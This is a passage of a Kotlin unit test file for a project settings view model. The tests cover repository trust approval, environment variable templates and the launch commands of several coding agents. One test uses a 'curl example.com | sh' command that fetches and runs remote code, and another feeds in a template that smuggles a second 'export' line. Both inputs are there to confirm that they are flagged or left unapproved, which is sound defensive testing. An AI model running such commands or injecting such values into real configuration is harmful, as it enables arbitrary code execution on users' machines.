        val trust = FakeRepositoryTrust(mapOf(basePath to installSubject))
        declare(installCommands + listOf(listOf("sh", "-c", "curl example.com | sh")))

        val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)

        assertFalse(viewModel.repositoryApproved)
    }

    @Test
    fun `variables changed on disk show as not approved`() {
        val trust = FakeRepositoryTrust(mapOf(basePath to RepositoryApprovalSubject(variables = listOf("PORT" to "\${port}"))))
        provisioningSource = FakeRepositoryProvisioningSource(
            byRepository = mapOf(
                basePath to RepositoryProvisioning(
                    environment = EnvironmentDeclaration(listOf(parseEnvironmentVariable("PORT", "\${port}"), parseEnvironmentVariable("API_URL", "https://example.com"))),
                ),
            ),
        )

        val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)

        assertFalse(viewModel.repositoryApproved)
    }

    @Test
    fun `approving from settings approves the declared variables`() {
        provisioningSource = FakeRepositoryProvisioningSource(
            byRepository = mapOf(basePath to RepositoryProvisioning(environment = EnvironmentDeclaration(listOf(parseEnvironmentVariable("PORT", "\${port}"))))),
        )
        val trust = FakeRepositoryTrust()
        val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)

        viewModel.approveRepository()

        assertTrue(trust.isApproved(basePath, RepositoryApprovalSubject(variables = listOf("PORT" to "\${port}"))))
    }

    private fun addVariableAndSave(viewModel: ProjectConfigViewModel) {
        viewModel.addEnvironmentRow()
        val row = viewModel.repositoryDraft.environment.last().id
        viewModel.updateEnvironmentRow(row, name = "PORT", template = "\${port}")
        assertIs<SaveOutcome.Saved>(viewModel.submit(previewConfirmed = true))
    }

    @Test
    fun `saving a variable in settings approves it along with approved commands`() {
        val trust = FakeRepositoryTrust(mapOf(basePath to installSubject))
        val viewModel = viewModelWithCommands(trust)

        addVariableAndSave(viewModel)

        assertTrue(trust.isApproved(basePath, installSubject.copy(variables = listOf("PORT" to "\${port}"))))
        assertTrue(viewModel.repositoryApproved)
    }

    @Test
    fun `saving a variable in a repository without commands approves it`() {
        val trust = FakeRepositoryTrust()
        val viewModel = viewModelFor(projectWith(), trust = trust)

        addVariableAndSave(viewModel)

        assertTrue(trust.isApproved(basePath, RepositoryApprovalSubject(variables = listOf("PORT" to "\${port}"))))
    }

    @Test
    fun `saving a variable never approves commands the user didn't approve`() {
        val trust = FakeRepositoryTrust()
        val viewModel = viewModelWithCommands(trust)

        addVariableAndSave(viewModel)

        assertTrue(trust.approvals.isEmpty())
        assertFalse(viewModel.repositoryApproved)
    }

    @Test
    fun `flags templates with line breaks or control characters`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.addEnvironmentRow()
        val row = viewModel.repositoryDraft.environment.single().id

        viewModel.updateEnvironmentRow(row, name = "APP_NAME", template = "demo\nexport OTHER=1")

        assertEquals(RepositoryConfigIssue.InvalidVariableValue, viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentTemplate(row)))
        assertIs<SaveOutcome.InvalidRepositoryConfig>(viewModel.submit(previewConfirmed = true))
    }

    @Test
    fun `a project stored with one agent shows a single agent`() {
        val viewModel = viewModelFor(projectWith())

        assertEquals(listOf(AgentDraft()), viewModel.agents)
    }

    @Test
    fun `a second agent is saved after the default one`() {
        val viewModel = viewModelFor(projectWith())

        viewModel.addAgent()
        viewModel.updateAgent(1) { it.copy(name = "Codex", command = "codex --full-auto", useHeadroom = false) }
        assertIs<SaveOutcome.Saved>(viewModel.submit())

        val saved = projectRepository.list().single().config
        assertEquals("claude", saved.agentLaunchConfig.agentCommand)
        assertEquals(listOf(AgentLaunchConfig(name = "Codex", agentCommand = "codex --full-auto", useHeadroom = false)), saved.additionalAgents)
    }

    @Test
    fun `making another agent the default moves it into the default field`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.addAgent()
        viewModel.updateAgent(1) { it.copy(name = "Codex", command = "codex") }

        viewModel.makeDefault(1)
        assertIs<SaveOutcome.Saved>(viewModel.submit())

        val saved = projectRepository.list().single().config
        assertEquals("Codex", saved.agentLaunchConfig.displayName)
        assertEquals(listOf("Claude"), saved.additionalAgents.map { it.displayName })
    }

    @Test
    fun `two agents with the same name cannot be saved`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.addAgent()
        viewModel.updateAgent(1) { it.copy(name = "Claude", command = "claude --model opus") }

        assertEquals(setOf("Claude"), viewModel.duplicatedAgentNames)
        assertEquals(ProjectConfigField.AGENT_NAME, assertIs<SaveOutcome.Invalid>(viewModel.submit()).firstInvalidField)
    }

    @Test
    fun `the last agent cannot be removed`() {
        val viewModel = viewModelFor(projectWith())

        viewModel.removeAgent(0)

        assertEquals(1, viewModel.agents.size)
    }

    @Test
    fun `an agent can be removed and reordered`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.addAgent()
        viewModel.updateAgent(1) { it.copy(name = "Codex", command = "codex") }
        viewModel.addAgent()
        viewModel.updateAgent(2) { it.copy(name = "Gemini", command = "gemini") }

        viewModel.moveAgent(2, 1)
        assertEquals(listOf("Claude", "Gemini", "Codex"), viewModel.agents.map { it.toConfig().displayName })
        viewModel.removeAgent(1)
        assertEquals(listOf("Claude", "Codex"), viewModel.agents.map { it.toConfig().displayName })
    }
}
